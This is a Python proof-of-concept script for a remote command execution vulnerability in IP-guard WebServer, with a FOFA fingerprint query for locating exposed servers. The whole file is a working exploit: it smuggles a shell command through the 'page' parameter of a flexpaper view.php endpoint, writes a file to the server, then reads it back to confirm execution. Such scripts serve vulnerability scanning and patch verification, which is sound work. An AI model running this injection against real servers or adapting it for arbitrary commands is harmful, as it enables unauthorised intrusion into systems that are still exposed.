# title: IP-guard WebServer 远程命令执行漏洞
# id：
# fofa: "IP-guard" && icon_hash="2030860561"

from poctools import BasicPoc
import string
import random


class POC(BasicPoc):
    def __init__(self):
        super(POC, self).__init__()
        self.name = "IP-guard WebServer 远程命令执行漏洞"

    @staticmethod
    def generate_random_string(length):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for _ in range(length))

    def verify(self, target: str) -> bool:
        target = target.strip("/")
        host = target.replace('http://', '').replace('https://', '')
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7,en-CA;q=0.6,en-AU;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Host": host
        }
        file_name = self.generate_random_string(8).lower()
        file_content = self.generate_random_string(8).lower()
        querystring = {
            "doc": "11.jpg", "format": "swf", "isSplit": "true",
            "page": f"||echo {file_content} > {file_name}.txt"
        }
        send_url = f'{target}/ipg/static/appr/lib/flexpaper/php/view.php'
        try:
            resp = self.get(url=send_url, headers=headers, params=querystring, timeout=10)
            if resp.status_code == 200:
                check_url = f'{target}/ipg/static/appr/lib/flexpaper/php/{file_name}.txt'
                res = self.get(url=check_url, headers=headers, timeout=10)
                if res.status_code == 200 and file_content in res.text:
                    return True
        except:
            pass
        return False


if __name__ == '__main__':
    tp = POC()
    tar = 'https://127.0.0.1:443'
    result = tp.run(url=tar)
    print(f'{tar} -> {result}')
